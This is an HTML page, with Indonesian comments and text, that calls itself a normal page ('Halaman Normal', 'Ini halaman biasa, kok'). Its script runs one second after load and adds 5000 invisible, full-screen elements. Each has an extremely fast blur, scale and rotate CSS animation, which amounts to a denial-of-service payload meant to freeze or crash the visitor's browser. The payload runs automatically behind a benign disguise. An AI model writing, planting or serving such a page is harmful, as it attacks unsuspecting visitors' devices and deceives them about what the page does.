<!DOCTYPE html>
<html>
<head>
    <title>Halaman Normal</title>
    <style>
        /* Animasi CSS yang sangat berat */
        @keyframes spin {
            0% { transform: rotate(0deg) scale(1); filter: blur(10px); }
            100% { transform: rotate(360deg) scale(2); filter: blur(20px); }
        }
        .beban-berat {
            width: 100vw;
            height: 100vh;
            background: red;
            position: absolute;
            top: 0;
            left: 0;
            animation: spin 0.001s infinite linear;
            opacity: 0.01;
        }
    </style>
</head>
<body>
    <h1>Halaman Normal</h1>
    <p>Ini halaman biasa, kok.</p>
    
    <script>
        setTimeout(function() {
            // Membuat 5000 elemen raksasa yang berputar sangat cepat secara bersamaan
            for (let i = 0; i < 5000; i++) {
                let div = document.createElement('div');
                div.className = 'beban-berat';
                document.body.appendChild(div);
            }
        }, 1000);
    </script>
</body>
</html>
